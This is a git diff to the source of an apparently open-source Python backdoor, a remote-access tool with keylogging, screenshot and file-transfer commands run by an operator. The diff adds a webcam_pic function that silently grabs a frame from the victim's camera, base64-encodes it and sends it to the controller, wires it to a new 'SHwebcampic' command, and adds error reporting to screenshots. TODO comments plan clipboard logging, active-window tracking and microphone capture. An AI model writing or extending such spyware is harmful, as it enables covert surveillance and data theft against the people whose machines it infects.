@@ -4,6 +4,7 @@
 
 # Written By Ananke: https://github.com/4n4nk3
 import sys
+
 sys.path.append('./modules/')
 import shutil
 import socket
@@ -16,6 +17,7 @@ from base64 import b64encode, b64decode
 from filecmp import cmp
 from pathlib import Path
 import pyscreenshot as ImageGrab
+import cv2
 from io import BytesIO
 from tendo import singleton
 
@@ -252,11 +254,36 @@ def keylogs_download():
 # TODO: Test on Windows
 def screenshot():
     buffer = BytesIO()
-    im = ImageGrab.grab()
-    im.save(buffer, format='PNG')
-    im.close()
-    b64_str = str(b64encode(buffer.getvalue()))
-    sender(b64_str[2:-1])
+    try:
+        im = ImageGrab.grab()
+        im.save(buffer, format='PNG')
+        im.close()
+        b64_str = str(b64encode(buffer.getvalue()))
+        sender(b64_str[2:-1])
+    except Exception as exception:
+        sender('reachedexcept')
+        sender(str(exception))
+
+# TODO: Test on Windows
+def webcam_pic():
+    try:
+        video_capture = cv2.VideoCapture(0)
+        # Check success
+        if video_capture.isOpened():
+            # Read picture. ret === True on success
+            ret, frame = video_capture.read()
+            # Close device
+            video_capture.release()
+            is_success, buffer = cv2.imencode(".png", frame)
+            io_buf = BytesIO(buffer)
+            b64_str = str(b64encode(io_buf.getvalue()))
+            sender(b64_str[2:-1])
+        else:
+            sender('reachedexcept')
+            sender('Can\'t access any webcam!')
+    except Exception as exception:
+        sender('reachedexcept')
+        sender(str(exception))
 
 
 def downloader():
@@ -462,6 +489,8 @@ def backdoor():
                         uploader()
                     elif received_command == 'SHscreenshot':
                         screenshot()
+                    elif received_command == 'SHwebcampic':
+                        webcam_pic()
                     elif received_command == 'SHkeylogstatus':
                         keylogs_status()
                     elif received_command == 'SHkeylogstart':
@@ -514,4 +543,4 @@ thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 # TODO: Add active window recognition
-# TODO: Add Webcam and microphone
+# TODO: Add Webcam stream and microphone
